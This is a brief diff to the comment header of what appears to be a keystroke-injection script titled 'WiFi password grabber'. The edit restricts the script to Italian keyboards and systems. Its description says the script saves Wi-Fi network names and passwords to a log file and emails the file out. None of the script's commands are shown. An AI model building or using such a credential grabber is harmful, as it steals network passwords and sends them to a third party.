@@ -1,4 +1,4 @@
-REM Title: WiFi password grabber
+REM Title: WiFi password grabber only Italian language keyboard and os
 REM Author: Gidalo
 REM Version: 1
 REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from Aruba account.
